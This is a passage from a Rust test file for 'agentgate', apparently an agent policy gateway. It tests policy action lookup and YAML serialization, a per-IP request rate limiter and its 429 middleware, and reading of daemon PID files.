        name: "pipeline".to_string(),
        description: "CI/CD automated pipeline policy".to_string(),
        guardrails: true,
        allow: vec![],
        deny: vec![],
        rules: vec![],
        actions,
    };

    assert!(policy.get_action("deploy").is_some());
    assert!(policy.get_action("nonexistent").is_none());

    let act = policy.get_action("deploy").unwrap();
    assert_eq!(act.steps.len(), 2);
    assert!(act.stop_on_failure);

    // Verify YAML serialization and roundtrip
    let yaml_str = serde_yaml::to_string(&policy).unwrap();
    assert!(yaml_str.contains("actions:"));
    assert!(yaml_str.contains("deploy:"));
    assert!(yaml_str.contains("stop_on_failure: true"));

    let loaded: Policy = serde_yaml::from_str(&yaml_str).unwrap();
    assert_eq!(loaded.name, "pipeline");
    assert!(loaded.get_action("deploy").is_some());
}

#[tokio::test]
async fn test_request_rate_limiter_burst_and_throttle() {
    use agentgate::server::RequestRateLimiter;
    use std::net::IpAddr;

    let ip: IpAddr = "203.0.113.42".parse().unwrap();
    // Capacity 3, refill 1 token/sec
    let limiter = RequestRateLimiter::new(3.0, 1.0);

    // First 3 requests must succeed (consuming burst capacity)
    assert!(limiter.check_rate_limit(&ip).is_ok());
    assert!(limiter.check_rate_limit(&ip).is_ok());
    assert!(limiter.check_rate_limit(&ip).is_ok());

    // 4th immediate request must be rejected with retry_after >= 1
    let err = limiter.check_rate_limit(&ip);
    assert!(err.is_err());
    assert!(err.unwrap_err() >= 1);

    // Other IP should have its own independent bucket
    let other_ip: IpAddr = "203.0.113.43".parse().unwrap();
    assert!(limiter.check_rate_limit(&other_ip).is_ok());
}

#[tokio::test]
async fn test_rate_limit_middleware_returns_429() {
    use agentgate::config::AgentGateConfig;
    use agentgate::server::{AppState, create_router, RequestRateLimiter};
    use axum::extract::connect_info::ConnectInfo;
    use axum::http::{Request, StatusCode};
    use tower::ServiceExt;
    use std::net::SocketAddr;
    use std::sync::Arc;

    let temp_dir = std::env::temp_dir().join(format!("agentgate-ratelimit-test-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&temp_dir).unwrap();

    let config = AgentGateConfig {
        config_dir: temp_dir.clone(),
        config_file: temp_dir.join("config.yaml"),
        client_file: temp_dir.join("client.yaml"),
        policies_dir: temp_dir.join("policies"),
        tokens_file: temp_dir.join("tokens.yaml"),
        certs_dir: temp_dir.join("certs"),
        logs_dir: temp_dir.join("logs"),
        pid_file: temp_dir.join("pid"),
        listen_addr: "127.0.0.1".to_string(),
        listen_port: 7991,
        allowed_origins: vec![],
    };

    // Capacity 2, 0 refill rate
    let limiter = RequestRateLimiter::new(2.0, 0.0);

    let state = AppState {
        tokens_file: config.tokens_file.clone(),
        policies_dir: config.policies_dir.clone(),
        audit_logger: Arc::new(agentgate::audit::AuditLogger::new(config.logs_dir.clone())),
        trusted_proxies: vec![],
        auth_throttler: agentgate::server::AuthThrottler::default(),
        rate_limiter: limiter,
    };

    let router = create_router(&config, state);

    let client_addr: SocketAddr = "192.0.2.10:55555".parse().unwrap();

    let make_req = || {
        let mut req = Request::builder()
            .uri("/health")
            .method("GET")
            .body(axum::body::Body::empty())
            .unwrap();
        req.extensions_mut().insert(ConnectInfo(client_addr));
        req
    };

    // Request 1: 200 OK
    let res1 = router.clone().oneshot(make_req()).await.unwrap();
    assert_eq!(res1.status(), StatusCode::OK);

    // Request 2: 200 OK
    let res2 = router.clone().oneshot(make_req()).await.unwrap();
    assert_eq!(res2.status(), StatusCode::OK);

    // Request 3: 429 TOO MANY REQUESTS
    let res3 = router.clone().oneshot(make_req()).await.unwrap();
    assert_eq!(res3.status(), StatusCode::TOO_MANY_REQUESTS);
    assert!(res3.headers().contains_key("retry-after"));
}

#[test]
fn test_find_running_daemon_reads_pid_file() {
    use agentgate::cli::{find_running_daemon, read_pid};
    use agentgate::config::AgentGateConfig;

    let temp_dir = std::env::temp_dir().join(format!("agentgate-pid-test-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&temp_dir).unwrap();

    let pid_file = temp_dir.join("agentgate.pid");
    let my_pid = std::process::id() as i32;
    std::fs::write(&pid_file, my_pid.to_string()).unwrap();

    let config = AgentGateConfig {
        config_dir: temp_dir.clone(),
        config_file: temp_dir.join("config.yaml"),
        client_file: temp_dir.join("client.yaml"),
        policies_dir: temp_dir.join("policies"),
        tokens_file: temp_dir.join("tokens.yaml"),
        certs_dir: temp_dir.join("certs"),
        logs_dir: temp_dir.join("logs"),
        pid_file: pid_file.clone(),
        listen_addr: "127.0.0.1".to_string(),
        listen_port: 7991,
        allowed_origins: vec![],
    };

    let detected = find_running_daemon(&config);
    assert_eq!(detected, Some(my_pid));

    // Stale PID test: when PID is not running, read_pid returns None and cleans up
    let stale_pid = 999999;
    std::fs::write(&pid_file, stale_pid.to_string()).unwrap();
    assert_eq!(read_pid(&pid_file), None);
    assert!(!pid_file.exists());
}






